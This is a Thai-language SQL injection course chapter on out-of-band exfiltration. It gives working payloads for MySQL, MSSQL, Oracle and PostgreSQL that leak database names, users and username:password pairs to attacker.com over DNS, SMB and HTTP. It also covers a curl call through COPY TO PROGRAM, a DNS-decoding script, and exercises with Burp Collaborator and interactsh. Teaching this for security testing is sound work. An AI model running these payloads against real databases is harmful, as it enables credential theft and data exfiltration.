# Part 024: Out-of-Band SQL Injection (OOB SQLi)

## ภาพรวม

Out-of-Band SQL Injection ใช้ช่องทางที่แตกต่างจาก HTTP response เพื่อส่งข้อมูลออกมา เช่น DNS lookups, HTTP requests ไปยัง external servers หรือ SMB connections

**ขั้นตอนที่ 341-360**

---

## 341. หลักการ OOB SQL Injection

### 41.1 ทำไมต้องใช้ OOB?

```
เมื่อ:
- Application ไม่แสดง error messages
- Response ดูเหมือนกันทุกกรณี (Boolean ไม่ได้ผล)
- Time-based ช้าเกินไปหรือไม่เสถียร
- Network conditions ทำให้ timing ไม่แม่นยำ

OOB ส่งข้อมูลผ่าน:
- DNS requests (ง่ายที่สุด)
- HTTP requests ไปยัง external server
- SMB connections (Windows)
- Email (Oracle UTL_SMTP)
```

### 41.2 Infrastructure ที่ต้องมี

```
1. Server/domain ที่ควบคุมได้
   - Domain ที่ nameserver อยู่ในการควบคุม
   - สำหรับรับ DNS queries
   
2. HTTP/HTTPS server
   - สำหรับรับ HTTP callbacks
   
3. Tools:
   - Burp Suite Collaborator (ง่ายที่สุด)
   - interactsh (open-source alternative)
   - DNScat2
   - tcpdump + custom domain
```

---

## 342. DNS-Based Exfiltration

### 42.1 MySQL DNS Lookup

```sql
-- MySQL ใช้ LOAD_FILE เพื่อทำ UNC request บน Windows
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\share'));

-- ส่ง database name
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));

-- ส่ง username
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\share'));
```

### 42.2 MSSQL DNS Lookup

```sql
-- xp_dirtree ทำ SMB/DNS request
EXEC xp_dirtree '\\\\attacker.com\\share';

-- DNS ด้วย xp_fileexist
EXEC xp_fileexist '\\\\attacker.com\\share';

-- ส่ง data ผ่าน DNS
DECLARE @data nvarchar(256);
SET @data = (SELECT TOP 1 master.dbo.fn_varbintohexstr(convert(varbinary, name)) 
             FROM master.sys.databases);
EXEC xp_dirtree ('\\\\' + @data + '.attacker.com\\share');
```

### 42.3 Oracle DNS Lookup

```sql
-- UTL_HTTP ทำ HTTP request (ทำให้เกิด DNS lookup)
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com/') FROM dual;

-- UTL_INADDR.GET_HOST_ADDRESS ทำ DNS lookup
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual;

-- DBMS_LDAP
DECLARE
  l_session DBMS_LDAP.SESSION;
BEGIN
  l_session := DBMS_LDAP.init((SELECT user FROM dual)||'.attacker.com', 389);
END;
/
```

### 42.4 PostgreSQL DNS Lookup

```sql
-- dblink ทำ DNS lookup
SELECT * FROM dblink('host='||(SELECT current_user)||'.attacker.com dbname=a', 'SELECT 1') AS t(x int);

-- copy to program
COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?data='||(SELECT current_user)||'';
```

---

## 343. HTTP-Based Exfiltration

### 43.2 MSSQL HTTP Requests

```sql
-- ใช้ OLE Automation
DECLARE @object INT;
DECLARE @response VARCHAR(8000);

-- เปิด OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- ส่ง HTTP GET request
EXEC sp_OACreate 'MSXML2.XMLHTTP', @object OUT;
EXEC sp_OAMethod @object, 'open', NULL, 'GET', 
  'http://attacker.com/?data='+(SELECT TOP 1 name FROM sys.databases), FALSE;
EXEC sp_OAMethod @object, 'send';
```

### 43.3 Oracle HTTP Requests

```sql
-- UTL_HTTP (ต้องการ EXECUTE privilege)
DECLARE
  req utl_http.req;
  resp utl_http.resp;
BEGIN
  req := utl_http.begin_request(
    'http://attacker.com/?data=' || (SELECT user FROM dual));
  resp := utl_http.get_response(req);
  utl_http.end_response(resp);
END;
/

-- ส่งข้อมูลที่ encoded
DECLARE
  data varchar2(1000);
BEGIN
  SELECT RAWTOHEX(UTL_RAW.CAST_TO_RAW(username||':'||password)) 
  INTO data FROM users WHERE rownum=1;
  
  UTL_HTTP.REQUEST('http://attacker.com/?d='||data);
END;
/
```

---

## 344. Burp Collaborator สำหรับ OOB Testing

```
Burp Suite Collaborator เป็น service ที่รับ:
- DNS lookups
- HTTP/HTTPS requests
- SMTP connections

ขั้นตอนการใช้:
1. เปิด Burp Suite Professional
2. Burp menu → Burp Collaborator client
3. Copy Collaborator URL
4. ใส่ URL ใน SQL payload:
   SELECT LOAD_FILE('\\\\xxx.burpcollaborator.net\\test');
5. รอและดู interactions ใน Collaborator client
```

---

## 345. Interactsh (Open-Source Alternative)

```bash
# ติดตั้ง interactsh
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# รัน client
interactsh-client

# Output:
# [INF] Listing on oast.pro
# [INF] FQDN: abcdef123.oast.pro
# [INF] Waiting for interactions...

# ใช้ FQDN ใน payloads:
# SELECT LOAD_FILE('\\\\abcdef123.oast.pro\\test');
```

---

## 346. การดักจับ DNS Requests

### 46.2 Decode DNS Data

```python
#!/usr/bin/env python3
"""
Decode data exfiltrated via DNS
"""

import re
import binascii

def decode_dns_exfil(hostname: str) -> str:
    """
    Decode exfiltrated data from DNS hostname
    """
    match = re.match(r'^([^.]+)\..+$', hostname)
    if not match:
        return hostname
    
    data = match.group(1)
    
    try:
        decoded = binascii.unhexlify(data).decode('utf-8', errors='replace')
        return decoded
    except:
        return data


samples = [
    "726f6f74.attacker.com",
    "admin.attacker.com",
    "4d7953514c.attacker.com",
]

for sample in samples:
    print(f"DNS: {sample}")
    print(f"Decoded: {decode_dns_exfil(sample)}")
    print()
```

---

## 347. Advanced OOB Techniques

### 47.1 Data Size Limitations

```
DNS hostname ต้องไม่เกิน 255 characters
แต่ละ label (ระหว่าง .) ต้องไม่เกิน 63 characters

วิธีส่งข้อมูลยาว:
1. ส่งทีละส่วน
2. Compress ข้อมูลก่อน
3. Hash ข้อมูล (ส่งแค่ hash สำหรับ verify)
4. ใช้ HTTP request แทน (ไม่มีขีดจำกัด)
```

### 47.2 Exfiltrating Multiple Values

```sql
-- MySQL: ส่งทีละ row ผ่าน DNS
-- Row 1
SELECT LOAD_FILE(CONCAT('\\\\', 
  (SELECT HEX(CONCAT(username,0x3a,password)) FROM users LIMIT 0,1),
  '.attacker.com\\share'));

-- Row 2
SELECT LOAD_FILE(CONCAT('\\\\', 
  (SELECT HEX(CONCAT(username,0x3a,password)) FROM users LIMIT 1,1),
  '.attacker.com\\share'));
```

---

## 348. แบบฝึกหัด

### Exercise 1: Burp Collaborator

1. เปิด Burp Suite Professional
2. สร้าง Collaborator URL
3. สร้าง SQL payload ด้วย DNS lookup
4. ส่ง request และดู interactions

### Exercise 2: Interactsh

1. ติดตั้ง interactsh-client
2. รับ FQDN จาก interactsh
3. ทดสอบ OOB payload
4. Decode ข้อมูลที่ได้รับ

---

## สรุป

Out-of-Band SQL Injection:

1. **DNS exfil** - ง่ายที่สุด, ผ่าน firewall ได้ง่าย
2. **HTTP callbacks** - ส่งข้อมูลได้มากกว่า, ต้องการ HTTP server
3. **SMB** - Windows-specific, ใช้ xp_dirtree/xp_fileexist
4. **Burp Collaborator/Interactsh** - ง่ายที่สุดสำหรับ testing

---

*Part 024 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
